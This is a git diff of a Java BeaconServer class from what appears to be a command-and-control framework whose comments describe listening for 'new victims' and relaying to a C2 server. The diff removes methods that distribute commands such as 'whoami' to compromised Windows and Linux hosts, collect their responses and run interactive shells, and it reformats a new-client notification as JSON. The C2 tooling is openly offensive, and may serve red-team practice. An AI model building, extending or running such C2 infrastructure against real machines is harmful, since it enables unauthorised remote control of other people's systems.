@@ -2,7 +2,6 @@ package Servers.Beacon;
 
 import java.util.Scanner;
 import Servers.Duplexer;
-import Servers.notifyLock;
 import Servers.encryption.aes.*;
 import Servers.encryption.rsa.*;
 
@@ -16,10 +15,6 @@ import java.security.MessageDigest;
 import java.nio.charset.StandardCharsets;
 
 public class BeaconServer implements Runnable{
-    // Dictionaries to Map IP's to Client responses
-    private HashMap<String,ArrayList<String>> windowsClientResponses;
-    private HashMap<String,ArrayList<String>> linuxClientResponses;
-
     // Dictionary to Map IP's to Objects that handle them
     private HashMap<String,BeaconClientHandler> windowsClientObjects;
     private HashMap<String,BeaconClientHandler> linuxClientObjects;
@@ -47,11 +42,6 @@ public class BeaconServer implements Runnable{
     // RSA object used for rsa encryption to transfer AES keys with clients
     private rsa rsa;
 
-    // Text colors for Hard visuals
-    private String GREEN = "\u001B[32m";
-    private String RESET = "\u001B[37m";
-    private String RED = "\u001B[31m";
-
     /**
      * This Creates a new Beacon Server. The Server will listen for new victims, and communicate 
      * back to the C2 Server.
@@ -64,8 +54,6 @@ public class BeaconServer implements Runnable{
         this.settingUp = true;
         this.settingUpLock = new Object();
 
-        this.windowsClientResponses = new HashMap<>();
-        this.linuxClientResponses = new HashMap<>();
         this.windowsClientObjects = new HashMap<>();
         this.linuxClientObjects = new HashMap<>();
         this.windowsShellLocks = new HashMap<>();
@@ -188,186 +176,8 @@ public class BeaconServer implements Runnable{
         }
     }
 
-    /**
-     * Add Responses from commands run on the C2 Victims to an ArrayList containing all of their responses
-     * 
-     * @param IPAddress the IP Address of the Client that the response came from
-     * @param Response The Response sent from the client
-     */
-    protected void addDataToResponsesDictionaries(String IPAddress, String Response){
-        synchronized(windowsClientResponses){
-            synchronized(linuxClientResponses){
-                if(windowsClientResponses.keySet().contains(IPAddress)){
-                    windowsClientResponses.get(IPAddress).add(Response);
-                } else {
-                    linuxClientResponses.get(IPAddress).add(Response);
-                }
-            }
-        }
-    }
-
-    /**
-     * Get Responses from cleints to Commands issued by the C2 Server
-     * 
-     * @param scope Either Windows, Linux, or an IP Address. The IP address may contains Wildcards, such as 192.168.1.x
-     * @return A Hash map with the client's ip address as the key, and an ArrayList containing all of it's resonses as the value
-     */
-    protected HashMap<String, ArrayList<String>> getClientResponses(String scope){
-        HashMap<String, ArrayList<String>> responses = new HashMap<>();
-        if(scope.equals("Windows")){
-            synchronized(windowsClientResponses){
-                for(String ip : windowsClientResponses.keySet()) {
-                    responses.put(ip, windowsClientResponses.get(ip));
-                }
-            }
-        } else if(scope.equals("Linux")){
-            synchronized(linuxClientResponses){
-                for(String ip : linuxClientResponses.keySet()) {
-                    responses.put(ip, linuxClientResponses.get(ip));
-                }
-            }
-        // Range of IPs 
-        } else {
-            ArrayList<String> ips = getIPMatches(scope);
-            for (String ip : ips){
-                synchronized(windowsClientResponses){
-                    synchronized(linuxClientResponses){
-                        if(windowsClientResponses.keySet().contains(ip)){
-                            responses.put(ip, windowsClientResponses.get(ip));
-                        } else if(linuxClientObjects.keySet().contains(ip)){
-                            responses.put(ip, linuxClientResponses.get(ip));
-                        }
-                    }
-                }
-            }
-        }
-        return responses;
-    }
-
-    /**
-     * This function will provide the Status (Can the C2 Server still run commands on the victims) 
-     * of Clients that this Beacon Server is responsible for based on the Scope Parameter
-     * 
-     * @param Scope Either "All", "Windows", "Linux", or the IP Address (x.x.x.x) of the Computer of whose status is desired
-     * @return Returns A HashMap, With All of the Keys as IP Addresses, and the Value True or False. True if the client can
-     * communicate with the Beacon, False if the client cannot communicate with the Beacon
-     */
-    protected String getClientStatus(){
-        // Create a HashMap, to store Key/Value pairs in the form of IP's, and True/False.
-        // True if the client is still active, false if the client is no longer active.
-        HashMap<String, Boolean> clientStatus = new HashMap<>();
-
-        // Check all Windows Boxes
-        distributeCommands("Windows", "Test-Path C:\\Windows");
-        distributeCommands("Linux", "whoami");
-        try{
-            Thread.sleep(3000);
-        } catch(InterruptedException e){
-            e.printStackTrace();
-        }
-
-        for (String ip : windowsClientResponses.keySet()){
-            if (windowsClientResponses.get(ip).size() != 0){
-                if ((windowsClientResponses.get(ip).contains("True")) && !windowsClientResponses.get(ip).contains("DISCONNECTED")){
-                    // If responses contains the string we just send a command to get, then remove it, and give it true
-                    ArrayList<String> tempList = windowsClientResponses.get(ip);
-                    tempList.remove("True");
-                    windowsClientResponses.put(ip, tempList);
-                    clientStatus.put(ip, true);
-                } else {
-                    clientStatus.put(ip, false);
-                }
-            }   
-        }
-
-        // Check all Linux Boxes
-        for (String ip : linuxClientResponses.keySet()){
-            if (linuxClientResponses.get(ip).size() != 0){
-                if (linuxClientResponses.get(ip).contains("root") && !linuxClientResponses.get(ip).contains("DISCONNECTED")){
-                    // If responses contains the string we just send a command to get, then remove it, and give it true
-                    ArrayList<String> tempList = linuxClientResponses.get(ip);
-                    tempList.remove("root");
-                    linuxClientResponses.put(ip, tempList);
-                    clientStatus.put(ip, true);
-                } else {
-                    clientStatus.put(ip, false);
-                }
-            }   
-        }
-        
-
-        // Creating fire visually pleasing table of client status
-        String table = " ________________________________________________\n";
-        table += String.format("| %-20s | %-23s |\n", "IP", "Connection Status");
-        table += "|______________________|_________________________|\n";
-        for (String ip : clientStatus.keySet()) {
-            String status;
-            boolean status_bool;
-            if (clientStatus.get(ip)) {
-                status = GREEN + "CONNECTED :D" + RESET;
-                status_bool = false;
-            } else {
-                status = RED + "DISCONNECTED D:" + RESET;
-                status_bool = true;
-            }
-            // If the status is disconnected
-            if (status_bool){
-                table += String.format("| %-20s | %-33s |\n", ip, status);
-            }
-            // If the status is connected
-            else {
-                table += String.format("| %-20s | %-33s |\n", ip, status);
-            }
-        }
-        table += "|______________________|_________________________|\n";
-        return table;
-    }
-
     public int getShellID(){
         return shellID;
-    }
-
-    /**
-     * getShellResponse is used to send a command to a client, and immediately after return the responses from this
-     * client to the C2 Server
-     * @param clientIP
-     * @param command
-     */
-    protected void getShellResponse(String clientIP, String command){
-        // Create variables that will be used
-        BeaconClientHandler clientHandlerObject = null;
-        Object clientShellLock = null;
-
-        // Assign variables correctly based on if the client is windows or linux
-        if(windowsClientObjects.containsKey(clientIP)){
-            clientHandlerObject = windowsClientObjects.get(clientIP);
-            clientShellLock = windowsShellLocks.get(clientIP);
-        } else if (linuxClientObjects.containsKey(clientIP)){
-            clientHandlerObject = linuxClientObjects.get(clientIP);
-            clientShellLock = linuxShellLocks.get(clientIP);
-        }
-
-        // Create a new thread that will notify the lock after 10 seconds, just in case we don't receive anything back from the client
-        shellID++;
-        notifyLock backupNotifyLock = new notifyLock(shellID, this, shellID);
-        Thread backupNotifyLockThread = new Thread(backupNotifyLock);
-        backupNotifyLockThread.start();
-
-        // Set variable so that the client knows to notify once it's done
-        clientHandlerObject.setIsShell(true);
-        clientHandlerObject.sendToClient(command);
-        try{
-            synchronized(clientShellLock){
-                clientShellLock.wait();
-            }
-        } catch (InterruptedException e){
-            e.printStackTrace();
-        }
-
-        // Once we have either been notified or the 10 seconds have bassed, we can send the responses back to the C2 server
-        C2Handler.sendResponsesToC2Server(clientIP);
-
-        clientHandlerObject.setIsShell(false);
     }
 
     /**
@@ -412,7 +222,7 @@ public class BeaconServer implements Runnable{
 
                     if(OSMessage.equals("Windows") || OSMessage.equals("Linux")){
                         // Send message to C2 announcing that a new client has been obtained
-                        C2Handler.sendDataToC2Server("New " + OSMessage + " Client at " + IPAddress);
+                        C2Handler.sendDataToC2Server("{\"ip\": \"" + IPAddress + "\", \"type\": \"client_connect\", \"data\": \"New " + OSMessage + " Client\"}");
                         
                         // Create object used for notifying/waiting when user wants responses back immeediately
                         Object shellLockObject = new Object();
@@ -439,11 +249,9 @@ public class BeaconServer implements Runnable{
                         // Add to client lists
                         if(OSMessage.equals("Windows")){
                             windowsClientObjects.put(IPAddress,clientHandler);
-                            windowsClientResponses.put(IPAddress, new ArrayList<String>());
                             windowsShellLocks.put(IPAddress, shellLockObject);
                         }else if(OSMessage.equals("Linux")){
                             linuxClientObjects.put(IPAddress,clientHandler);
-                            linuxClientResponses.put(IPAddress, new ArrayList<String>());
                             linuxShellLocks.put(IPAddress, shellLockObject);
                         }
                     }
